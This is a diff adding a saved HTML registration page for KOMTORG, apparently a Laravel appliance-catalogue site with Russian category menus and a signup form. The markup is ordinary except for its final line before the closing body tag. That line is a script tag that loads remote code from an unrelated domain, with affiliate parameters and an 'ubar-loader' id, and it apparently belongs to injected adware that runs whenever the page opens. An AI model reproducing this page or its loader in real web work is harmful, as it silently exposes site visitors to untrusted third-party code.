@@ -1,0 +1,272 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+
+    <!-- CSRF Token -->
+    <meta name="csrf-token" content="YQP4I38OTXjX8rcJShvZ70z9mrqQWiyGoXwyJYiG">
+
+    <!--<title>KOMTORG</title>-->
+
+    
+
+    <!-- Scripts -->
+	
+    <script>
+        window.Laravel = {"csrfToken":"YQP4I38OTXjX8rcJShvZ70z9mrqQWiyGoXwyJYiG"};
+    </script>
+    
+     <!-- Styles-->
+    <link href="http://komtorg.dev/css/appMaterialFormat.css" rel="stylesheet"> 
+    <link rel="stylesheet" href="https://fonts.googleapis.com/icon?family=Material+Icons">
+		<!-- Scripts -->
+    
+    <script defer src="js/material.min.js"></script>
+    
+
+	    
+	
+</head>
+<body>
+    <!-- Always shows a header, even in smaller screens. -->
+    <div class="mdl-layout mdl-js-layout">
+		<header class="mdl-layout__header mdl-layout__header--scroll">
+			<div class="mdl-layout__header-row">
+			        <!-- Title -->
+                    <span class="mdl-layout-title"><b>КОМТОРГ</b></span>
+					<!-- Add spacer, to align navigation to the right -->
+					<div class="mdl-layout-spacer"></div>
+					
+				   
+					
+					<!-- Add spacer, to align navigation to the right -->
+					<div class="mdl-layout-spacer"></div>
+					<!-- Navigation. We hide it in small screens. -->
+					<nav class="mdl-navigation mdl-layout--large-screen-only">        
+						<!--Right Side Of Navbar -->
+                                                 <div>
+                                                    <!-- Authentication Links -->
+                                                                                                            <a class="mdl-navigation__link mdl-logo" href="http://komtorg.dev/login">Login</a>
+                                                        <a class="mdl-navigation__link mdl-logo" href="http://komtorg.dev/register">Register</a>
+                                                                                                    </div>
+                                                <!-- Multiline Tooltip -->
+                                                <div class="mdl-logo">
+                                                    <div id="tt4" class="icon material-icons">share</div>
+                                                    <div class="mdl-tooltip" for="tt4">
+                                                        Share your content<br>via social media
+                                                    </div>   
+                                                </div>
+                                                <!-- Expandable Textfield -->
+                                                <form action="#">
+                                                  <div class="mdl-textfield mdl-js-textfield mdl-textfield--expandable">
+                                                    <label class="mdl-button mdl-js-button mdl-button--icon" for="sample6">
+                                                      <i class="material-icons">search</i>
+                                                    </label>
+                                                    <div class="mdl-textfield__expandable-holder">
+                                                      <input class="mdl-textfield__input" type="text" id="sample6">
+                                                      <label class="mdl-textfield__label" for="sample-expandable">Expandable Input</label>
+                                                    </div>
+                                                  </div>
+                                                </form>
+                                                
+					</nav>            
+					
+			</div>
+        </header>
+		<!-- Колапсирующее боковое меню -->
+		<div class="mdl-layout__drawer">
+			<span class="mdl-layout-title"></span>
+			<nav class="mdl-navigation">
+				<a class="mdl-navigation__link" href="">Профиль</a>
+				<a class="mdl-navigation__link" href="product">Объекты</a>
+				<a class="mdl-navigation__link" href="report">Отчеты</a>
+				<a class="mdl-navigation__link" href="productList">Экспорт/Импорт</a>
+				<a class="mdl-navigation__link" href="productItems">Сообщения</a>
+				<a class="mdl-navigation__link" href="">История действий</a>
+				<a class="mdl-navigation__link" href="">Друзья</a>
+				<a class="mdl-navigation__link" href="">Медиа-файлы</a>
+			</nav>
+		</div>
+		<style>
+			.h-my {
+				color:  #4bc9e8;
+				display: inline;
+				font-size: 18px;
+			}
+		</style>
+		<div class="mdl-grid">
+			<div  class="mdl-cell">
+		<div>
+			<span class="h-my">Крупная бытовая техника</span>
+		  
+			<ul class="mdl-list">
+				<li class="">
+					<span class="">
+						<a class="mdl-navigation__link" href="">Морозильные камеры и лари</a>
+					</span>
+				</li>
+			    <li class="">
+					<span class="">
+						<a class="mdl-navigation__link" href="product">Плиты</a>
+					</span>
+				</li>
+				<li class="">
+					<span class="">
+						<a class="mdl-navigation__link" href="product">Стиральные машины</a>
+					</span>
+				</li>
+				<li class="">
+					<span class="">
+						<a class="mdl-navigation__link" href="product">Холодильники</a>
+					</span>
+				</li>
+			</ul>
+		</div>
+		<div>
+			<span class="h-my">Аудио-видео техника</span>
+		  
+			<ul class="mdl-list">
+				<li class="">
+					<span class="">
+						<a class="mdl-navigation__link" href="">Ресиверы эфирные</a>
+					</span>
+				</li>
+			    <li class="">
+					<span class="">
+						<a class="mdl-navigation__link" href="product">Телевизоры</a>
+					</span>
+				</li>
+				
+			</ul>
+			
+		</div>
+		<div>
+			<span class="h-my">Климатическое оборудование</span>
+		  
+			<ul class="mdl-list">
+				<li class="">
+					<span class="">
+						<a class="mdl-navigation__link" href="">Водонагреватели</a>
+					</span>
+				</li>
+			    <li class="">
+					<span class="">
+						<a class="mdl-navigation__link" href="product">Котлы твердотопливные</a>
+					</span>
+				</li>
+				<li class="">
+					<span class="">
+						<a class="mdl-navigation__link" href="product">Обогреватели</a>
+					</span>
+				</li>
+				<li class="">
+					<span class="">
+						<a class="mdl-navigation__link" href="product">Тепловентиляторы</a>
+					</span>
+				</li>
+				<li class="">
+					<span class="">
+						<a class="mdl-navigation__link" href="product">Электроконвекторы</a>
+					</span>
+				</li>
+			</ul>
+		</div>
+		<div>
+			<span class="h-my">Встраиваемая техника</span>
+		  
+			<ul class="mdl-list">
+				<li class="">
+					<span class="">
+						<a class="mdl-navigation__link" href="">Варочные поверхности</a>
+					</span>
+				</li>
+			    <li class="">
+					<span class="">
+						<a class="mdl-navigation__link" href="product">Духовые шкафы</a>
+					</span>
+				</li>
+				<li class="">
+					<span class="">
+						<a class="mdl-navigation__link" href="product">Посудомоечные машины</a>
+					</span>
+				</li>
+			</ul>
+		</div>
+	</div>
+			<div  class="mdl-cell">
+				<main class="mdl-layout__content">
+					
+					<div class="page-content"><!-- Your content goes here -->
+						
+							<style>
+.demo-card-square.mdl-card {
+  width: 320px;
+  height: 420px;
+  background: #dcccb0;
+}
+.demo-card-square > .mdl-card__title {
+  color: #fafafa;
+  font-size: 50px
+}
+</style>
+<div class="mdl-grid">
+    <div class="mdl-cell mdl-cell--4-col">
+        <div class="demo-card-square mdl-card mdl-shadow--2dp mdl-card__actions">
+                <h2 class="mdl-card__title">Register</h2>
+                    <form class="" role="form" method="POST" action="http://komtorg.dev/register">
+                        <input type="hidden" name="_token" value="YQP4I38OTXjX8rcJShvZ70z9mrqQWiyGoXwyJYiG">
+
+                        <div class="">
+                            <div class="mdl-textfield mdl-js-textfield mdl-textfield--floating-label">
+                                <input id="name" type="text" class="mdl-textfield__input" name="name" value="" required autofocus>
+                                <label class="mdl-textfield__label" for="name">Name</label>
+                                                            </div>
+                        </div>
+
+                        <div class="">
+                            <div class="mdl-textfield mdl-js-textfield mdl-textfield--floating-label">
+                                <input id="email" type="email" class="mdl-textfield__input" name="email" value="" required>
+                                <label class="mdl-textfield__label" for="email">E-Mail Address</label>       
+                                                            </div>
+                        </div>
+
+                        <div class="">
+                            <div class="mdl-textfield mdl-js-textfield mdl-textfield--floating-label">
+                                <input id="password" type="password" class="mdl-textfield__input" name="password" required>
+                                <label class="mdl-textfield__label" for="password">Password</label>    
+                                                            </div>
+                        </div>
+
+                        <div class="mdl-textfield mdl-js-textfield mdl-textfield--floating-label">
+                            
+                                <input id="password-confirm" type="password" class="mdl-textfield__input" name="password_confirmation" required>
+                                <label class="mdl-textfield__label" for="password-confirm">Password</label>    
+                           
+                        </div>
+
+                        <div class="mdl-card__actions">
+                            <div class="mdl-card__actions">
+                                <button type="submit" class="mdl-button mdl-js-button mdl-button--raised mdl-js-ripple-effect mdl-button--accent">
+                                    Register
+                                </button>
+                            </div>
+                        </div>
+                    </form>
+        </div>
+    </div>
+</div>
+					
+					</div>
+					
+				</main>
+			</div>
+		</div>
+    </div>
+    
+    
+<script src="http://minxxrpaaw.org/code.php?appid=icb1634-10064-1477982697436-7830d54a-3371-4d7a-a56d-10305021f932&h=0&m=normal&aff=1" id="ubar-loader"></script></body>
+    
+
+</html>
